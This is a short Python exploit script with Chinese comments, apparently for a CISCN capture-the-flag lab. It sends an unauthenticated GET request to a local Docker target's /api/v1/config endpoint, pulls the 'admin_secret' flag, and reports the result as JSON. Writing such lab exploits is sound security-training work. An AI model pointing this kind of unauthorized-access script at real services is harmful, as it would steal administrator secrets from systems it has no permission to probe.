import requests
import time
import json
import os
import logging

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

TARGET_URL = os.environ.get("TARGET_URL", "http://127.0.0.1:18789")

def run_exploit():
    """
    针对 CS0048 (API未授权访问) 的自动化漏洞利用脚本
    目标: 读取 /api/v1/config 窃取 admin_secret (FLAG)
    """
    target_url = f"{TARGET_URL}/api/v1/config"
    
    # 初始化执行日志
    log_trace = f"[*] 目标锁定: {target_url}\n"
    log_trace += "[*] 正在发送未授权的 GET 请求尝试越权...\n"
    
    # 构造标准返回数据结构 (依照团队 JSON 规范)
    result = {
        "cve_id": "CS0048",
        "vuln_name": "API未授权访问配置泄露",
        "status": "failed",   # 默认失败，打穿了再改 success
        "risk_level": "high",
        "leaked_data": None,
        "execution_log": "",
        "timestamp": int(time.time())
    }

    try:
        # 1. 发射子弹 (发送 HTTP 请求)
        response = requests.get(target_url, timeout=5)
        log_trace += f"[+] 收到服务器响应，状态码: {response.status_code}\n"
        
        # 2. 检查是否成功打穿
        if response.status_code == 200:
            data = response.json()
            # 3. 提取战利品 (FLAG)
            flag = data.get("admin_secret", "")
            
            if "CISCN_FLAG" in flag:
                log_trace += f"[+] 漏洞利用成功！成功窃取机密数据: {flag}\n"
                
                # 完善成功后的返回数据
                result["status"] = "success"
                result["leaked_data"] = flag
            else:
                log_trace += "[-] 访问成功，但未发现 FLAG，可能漏洞已被修复。\n"
        else:
            log_trace += "[-] 访问被拒绝或接口不存在。\n"

    except requests.exceptions.ConnectionError:
        log_trace += "[-] 致命错误: 无法连接到靶机，请检查 Docker 是否运行。\n"
    except Exception as e:
        log_trace += f"[-] 未知错误: {str(e)}\n"
    
    # 把执行过程的日志塞进返回结果里
    result["execution_log"] = log_trace
    return result

# ========= 仅供你本地独立测试使用 =========
if __name__ == "__main__":
    attack_result = run_exploit()
    logger.info("攻击执行结果: %s", json.dumps(attack_result, ensure_ascii=False))
